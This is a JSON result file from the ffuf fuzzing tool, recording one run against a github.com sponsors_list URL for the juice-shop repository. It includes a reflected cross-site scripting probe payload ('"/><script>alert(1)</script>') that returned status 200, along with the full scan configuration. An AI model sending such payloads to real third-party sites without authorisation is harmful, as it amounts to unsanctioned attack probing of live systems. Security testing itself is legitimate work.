{"commandline":"ffuf -w /Users/raphaelpang/code/elise/payloads/temp/ef43884f-636e-41bf-8aa2-ef06f762a4c4.txt -u https://github.com/juice-shop/juice-shop/sponsors_list?block_button=false\u0026current_repository=juice-shop\u0026current_repository=FUZZ -of json -o /Users/raphaelpang/code/elise/data/results/ffuf/ffuf_1755680528142.json","time":"2025-08-20T17:02:08+08:00","results":[{"input":{"FFUFHASH":"5cbec1","FUZZ":"\"/\u003e\u003cscript\u003ealert(1)\u003c/script\u003e"},"position":1,"status":200,"length":2314,"words":252,"lines":19,"content-type":"text/html; charset=utf-8","redirectlocation":"","scraper":{},"duration":317212417,"resultfile":"","url":"https://github.com/juice-shop/juice-shop/sponsors_list?block_button=false\u0026current_repository=juice-shop\u0026current_repository=\"/\u003e\u003cscript\u003ealert(1)\u003c/script\u003e","host":"github.com"}],"config":{"autocalibration":false,"autocalibration_keyword":"FUZZ","autocalibration_perhost":false,"autocalibration_strategies":["basic"],"autocalibration_strings":[],"colors":false,"cmdline":"ffuf -w /Users/raphaelpang/code/elise/payloads/temp/ef43884f-636e-41bf-8aa2-ef06f762a4c4.txt -u https://github.com/juice-shop/juice-shop/sponsors_list?block_button=false\u0026current_repository=juice-shop\u0026current_repository=FUZZ -of json -o /Users/raphaelpang/code/elise/data/results/ffuf/ffuf_1755680528142.json","configfile":"","postdata":"","debuglog":"","delay":{"value":"0.00"},"dirsearch_compatibility":false,"encoders":[],"extensions":[],"fmode":"or","follow_redirects":false,"headers":{},"ignorebody":false,"ignore_wordlist_comments":false,"inputmode":"clusterbomb","cmd_inputnum":100,"inputproviders":[{"name":"wordlist","keyword":"FUZZ","value":"/Users/raphaelpang/code/elise/payloads/temp/ef43884f-636e-41bf-8aa2-ef06f762a4c4.txt","encoders":"","template":""}],"inputshell":"","json":false,"matchers":{"IsCalibrated":false,"Mutex":{},"Matchers":{"status":{"value":"200-299,301,302,307,401,403,405,500"}},"Filters":{},"PerDomainFilters":{}},"mmode":"or","maxtime":0,"maxtime_job":0,"method":"GET","noninteractive":false,"outputdirectory":"","outputfile":"/Users/raphaelpang/code/elise/data/results/ffuf/ffuf_1755680528142.json","outputformat":"json","OutputSkipEmptyFile":false,"proxyurl":"","quiet":false,"rate":0,"raw":false,"recursion":false,"recursion_depth":0,"recursion_strategy":"default","replayproxyurl":"","requestfile":"","requestproto":"https","scraperfile":"","scrapers":"all","sni":"","stop_403":false,"stop_all":false,"stop_errors":false,"threads":40,"timeout":10,"url":"https://github.com/juice-shop/juice-shop/sponsors_list?block_button=false\u0026current_repository=juice-shop\u0026current_repository=FUZZ","verbose":false,"wordlists":["/Users/raphaelpang/code/elise/payloads/temp/ef43884f-636e-41bf-8aa2-ef06f762a4c4.txt"],"http2":false,"client-cert":"","client-key":""}}